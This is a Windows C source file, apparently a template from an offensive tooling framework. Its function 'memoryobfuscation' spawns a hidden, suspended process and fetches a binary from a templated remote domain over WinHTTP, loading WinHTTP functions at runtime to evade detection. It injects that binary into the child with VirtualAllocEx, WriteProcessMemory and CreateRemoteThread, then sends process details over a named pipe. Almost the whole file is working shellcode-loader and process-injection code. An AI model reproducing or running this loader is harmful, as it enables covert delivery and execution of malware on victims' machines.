#include <winhttp.h>

typedef struct {
    void* baseAddress;
    DWORD size;
} TextSectionInfo;


TextSectionInfo GetTextSectionInfo(HMODULE hModule) {
    
    TextSectionInfo info = { 0 };

    BYTE* baseAddr = (BYTE*)hModule;
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddr;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddr + dosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeaders);

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        if (section->Name[0] == '.' && section->Name[1] == 't' && section->Name[2] == 'e' && section->Name[3] == 'x' && section->Name[4] == 't') {
            info.baseAddress = baseAddr + section->VirtualAddress;
            info.size = section->Misc.VirtualSize;
            break;
        }
        ++section;
    }

    return info;
}


void UIntToDecStr(DWORD val, char* buf, int* idx) {
    // convert val to decimal string, append to buf at *idx, update *idx
    char temp[12];
    int tempIdx = 0;

    if (val == 0) {
        buf[(*idx)++] = '0';
        return;
    }

    while (val > 0) {
        temp[tempIdx++] = '0' + (val % 10);
        val /= 10;
    }
    // digits reversed in temp, reverse-copy to buf
    for (int i = tempIdx - 1; i >= 0; --i) {
        buf[(*idx)++] = temp[i];
    }
}

void PtrToHexStr(void* ptr, char* buf, int* idx) {
    // convert pointer to hex string with leading "0x", append to buf, update *idx
    const char hexChars[] = "0123456789abcdef";
    unsigned long long val = (unsigned long long)(uintptr_t)ptr;

    buf[(*idx)++] = '0';
    buf[(*idx)++] = 'x';

    int started = 0;
    for (int shift = (sizeof(void*) * 8) - 4; shift >= 0; shift -= 4) {
        int digit = (val >> shift) & 0xF;
        if (digit != 0 || started || shift == 0) {
            buf[(*idx)++] = hexChars[digit];
            started = 1;
        }
    }
}


void memoryobfuscation(){

  
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    DWORD pid = GetCurrentProcessId();
    HMODULE hModule = GetModuleHandle(NULL);
    if (!hModule) {
        return;
    }
    TextSectionInfo textInfo = GetTextSectionInfo(hModule);

    const char* exeName = "{{PROCESS_SPAWN}}";
    size_t bufferSize = 256;
    //char* result = (char*)HeapAlloc(GetProcessHeap(), 0, bufferSize);
    char result[256];
    int idx = 0;
    //wsprintfA(result, "\"%s\" %lu 0x%p 0x%lx", exeName, pid, textInfo.baseAddress, textInfo.size);

    // Copy exeName with quotes:
    result[idx++] = '"';
    for (const char* p = exeName; *p; ++p) {
        result[idx++] = *p;
    }
    result[idx++] = '"';
    result[idx++] = ' ';

    // Append pid as decimal
    UIntToDecStr(pid, result, &idx);
    result[idx++] = ' ';

    // Append baseAddress as hex
    PtrToHexStr(textInfo.baseAddress, result, &idx);
    result[idx++] = ' ';

    // Append size as hex
    PtrToHexStr((void*)(uintptr_t)textInfo.size, result, &idx);

    result[idx] = '\0';



    const char* pipeName = "\\\\.\\pipe\\5c8a150ae68b4cbc8b5eeacb0f89b7aa";
    HANDLE hPipe = CreateNamedPipeA(
        pipeName,
        PIPE_ACCESS_OUTBOUND,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,
        0,0,0,
        NULL
    );

    if (!CreateProcessA(
        "{{PROCESS_SPAWN}}",
        result,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return;
    }

    // build shc array

    typedef HINTERNET (WINAPI *WinHttpOpen_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
    typedef HINTERNET (WINAPI *WinHttpConnect_t)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
    typedef HINTERNET (WINAPI *WinHttpOpenRequest_t)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
    typedef BOOL      (WINAPI *WinHttpSendRequest_t)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
    typedef BOOL      (WINAPI *WinHttpReceiveResponse_t)(HINTERNET, LPVOID);
    typedef BOOL      (WINAPI *WinHttpReadData_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL      (WINAPI *WinHttpCloseHandle_t)(HINTERNET);

    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
    if (!hWinHttp) return;
     
    WinHttpOpen_t WinHttpOpen = (WinHttpOpen_t)GetProcAddress(hWinHttp, "WinHttpOpen");
    WinHttpConnect_t WinHttpConnect = (WinHttpConnect_t)GetProcAddress(hWinHttp, "WinHttpConnect");
    WinHttpOpenRequest_t WinHttpOpenRequest = (WinHttpOpenRequest_t)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
    WinHttpSendRequest_t WinHttpSendRequest = (WinHttpSendRequest_t)GetProcAddress(hWinHttp, "WinHttpSendRequest");
    WinHttpReceiveResponse_t WinHttpReceiveResponse = (WinHttpReceiveResponse_t)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
    WinHttpReadData_t WinHttpReadData = (WinHttpReadData_t)GetProcAddress(hWinHttp, "WinHttpReadData");
    WinHttpCloseHandle_t WinHttpCloseHandle = (WinHttpCloseHandle_t)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
    
    if (!WinHttpOpen || !WinHttpConnect || !WinHttpOpenRequest || !WinHttpSendRequest || !WinHttpReceiveResponse || !WinHttpReadData || !WinHttpCloseHandle)
        return;
    
    HINTERNET hSession = WinHttpOpen(L"MyAgent", 1, NULL, NULL, 0); // INTERNET_OPEN_TYPE_PRECONFIG = 1
    if (!hSession) return;
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"{{SIDECAR_DOMAIN}}", 80, 0); // 443 for HTTPS
    if (!hConnect) return;
     
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"{{SIDECAR_PATH}}", NULL, NULL, NULL, NULL); //,WINHTTP_FLAG_SECURE);
    if (!hRequest) return;
    
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) return;
    if (!WinHttpReceiveResponse(hRequest, NULL)) return;
        
    DWORD size = 0;
    DWORD sidecar_bin_len = 0;
    unsigned char* sidecar_bin = (unsigned char*)VirtualAlloc(NULL, 0x20000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
      
    while (WinHttpReadData(hRequest, sidecar_bin + sidecar_bin_len, 0x1000, &size) && size > 0) {
        sidecar_bin_len += size;
    }

    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sidecar_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!WriteProcessMemory(pi.hProcess, remoteMem, sidecar_bin, sidecar_bin_len, NULL)) {
        return;
    }

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        return;
    }
    ConnectNamedPipe(hPipe, NULL);
    DWORD bytesWritten;
    WriteFile(hPipe, result, (DWORD)lstrlenA(result), &bytesWritten, NULL);

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
